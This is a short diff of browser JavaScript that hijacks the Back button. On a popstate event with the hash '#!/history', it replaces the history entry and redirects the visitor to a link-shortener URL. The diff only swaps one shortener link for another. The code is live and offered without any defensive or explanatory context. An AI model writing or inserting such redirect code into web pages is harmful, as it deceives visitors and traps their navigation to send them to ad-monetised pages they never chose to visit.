@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("http://idsly.com/DC5mi");
+      location.replace("http://ouo.io/FmnWe3");
     },0);
   }
 }, false);
